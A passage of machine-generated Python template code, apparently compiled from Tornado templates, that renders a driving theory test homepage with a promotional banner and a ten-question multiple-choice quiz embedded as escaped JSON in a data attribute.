 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
